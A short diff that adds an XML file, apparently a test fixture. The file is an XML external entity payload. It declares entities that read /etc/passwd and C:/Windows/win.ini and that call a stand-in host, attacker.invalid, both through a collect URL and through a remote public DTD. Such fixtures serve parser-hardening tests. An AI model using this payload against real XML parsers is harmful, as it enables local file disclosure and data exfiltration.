@@ -1,0 +1,8 @@
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY file SYSTEM "file:///etc/passwd">
+  <!ENTITY windows SYSTEM "file:///C:/Windows/win.ini">
+  <!ENTITY exfiltrate SYSTEM "http://attacker.invalid/collect?d=x">
+  <!ENTITY public PUBLIC "-//attacker//EN" "http://attacker.invalid/public.dtd">
+]>
+<data>&file;&windows;&exfiltrate;&public;</data>
